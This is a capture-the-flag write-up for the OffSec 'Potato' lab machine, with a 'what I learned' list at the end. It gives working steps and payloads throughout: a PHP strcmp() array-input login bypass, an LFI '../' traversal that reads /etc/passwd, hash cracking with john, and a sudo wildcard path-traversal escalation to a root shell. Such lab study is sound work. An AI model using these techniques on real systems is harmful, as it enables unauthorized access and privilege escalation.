# Potato

| Field | Details |
|-------|---------|
| **Platform** | OffSec Proving Grounds Play |
| **OS** | Linux (Ubuntu 20.04) |
| **Difficulty** | Easy |
| **Date** | 2026-04-11 |
| **Status** | Completed |

---

## Overview

This machine was a reminder that source code leaks are dangerous. Anonymous FTP exposed a PHP backup file that revealed both the login credentials and a strcmp() vulnerability — which I exploited to bypass authentication without the real password. From there, LFI in the admin dashboard read `/etc/passwd`, exposed a password hash, and cracked it. Privesc came from a sudo wildcard that let me traverse out of the allowed directory.

---

## Attack Path Summary

```
Anonymous FTP → index.php.bak (source code leak) → strcmp() bypass → Admin dashboard → LFI → /etc/passwd hash → crack → SSH → sudo wildcard privesc → root
```

---

## Enumeration

### Open Ports

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 8.2p1 |
| 80 | HTTP | Apache 2.4.41 — static page |
| 2112 | FTP | ProFTPD — anonymous login allowed |

### What stood out

- Port 80 was a dead end — static potato company page
- FTP on port 2112 (non-standard) allowed anonymous login
- Two files available: `welcome.msg` and `index.php.bak`

---

## Foothold

### Anonymous FTP — source code leak

```bash
ftp <IP> 2112
# username: anonymous, password: (blank)
get index.php.bak
get welcome.msg
```

`index.php.bak` revealed the entire login logic:

```php
$pass= "potato";
if (strcmp($_POST['username'], "admin") == 0 && strcmp($_POST['password'], $pass) == 0) {
```

Two things immediately obvious:
1. The password is `potato`
2. `strcmp()` is used — vulnerable to PHP type juggling

### Gobuster — finding the admin panel

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
```

Found `/admin` — login form with username and password fields.

Trying `admin:potato` failed (credentials had been changed). Used the strcmp() bypass instead.

### strcmp() bypass — PHP type juggling

`strcmp()` returns `NULL` when comparing a string to an array. In PHP, `NULL == 0` evaluates to `true` — so authentication passes without knowing the real password.

Intercepted the POST request in Burp and changed the body:

```
username=admin&password[]=
```

Response came back with `Set-Cookie: pass=serdesfsefhijosefjtfgyuhjiosefdfthgyjh` and a redirect to `dashboard.php`. Inside.

---

## Lateral Movement

### LFI in the Logs tab

The admin dashboard had a Logs tab. The file viewer sent a POST request:

```
POST /admin/dashboard.php?page=log
file=log_03.txt
```

Changed `file` to read system files:

```
file=../../../../../../etc/passwd
```

Got the full `/etc/passwd`. The last line was the interesting one:

```
webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash
```

Password hash directly in `/etc/passwd` — old-school MD5crypt.

### Cracking the hash

```bash
echo '$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/' > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Result: `dragon`

### SSH as webadmin

```bash
ssh webadmin@<IP>
# password: dragon
```

`local.txt` was in the home directory.

---

## Privilege Escalation

### sudo wildcard — path traversal

```bash
sudo -l
```

Output:
```
(ALL : ALL) /bin/nice /notes/*
```

The wildcard `*` allows any file inside `/notes/` — but it also allows path traversal out of it. Created a shell script and executed it via the traversal:

```bash
echo '/bin/bash' > /home/webadmin/shell.sh
chmod +x /home/webadmin/shell.sh
sudo /bin/nice /notes/../../../../home/webadmin/shell.sh
```

Root shell.

---

## Flags

- `local.txt` — `/home/webadmin/local.txt`
- `proof.txt` — `/root/proof.txt`

---

## What I learned

- Non-standard ports are worth scanning — FTP on 2112 would be missed without full port scan
- Source code leaks from `.bak` files are critical — always check FTP for backup files
- `strcmp()` in PHP is exploitable with array input — type juggling is a real attack class
- LFI doesn't need `../` if the app accepts absolute paths — try both
- Sudo wildcards with `*` can be abused with path traversal to execute arbitrary scripts as root
- `/etc/passwd` can contain actual hashes on older or misconfigured systems — always read the full file
